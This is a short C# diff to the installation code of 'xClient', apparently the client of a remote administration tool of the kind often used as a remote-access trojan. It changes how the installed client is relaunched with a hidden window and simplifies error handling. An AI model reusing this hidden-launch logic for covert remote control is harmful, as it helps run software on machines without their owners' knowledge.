@@ -91,7 +91,7 @@ namespace xClient.Core.Installation
             {
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
-                UseShellExecute = true,
+                UseShellExecute = false,
                 FileName = ClientData.InstallPath
             };
             try
@@ -100,8 +100,6 @@ namespace xClient.Core.Installation
             }
             catch (Exception)
             {
-                ClientData.Disconnect = true;
-                return;
             }
             ClientData.Disconnect = true;
         }
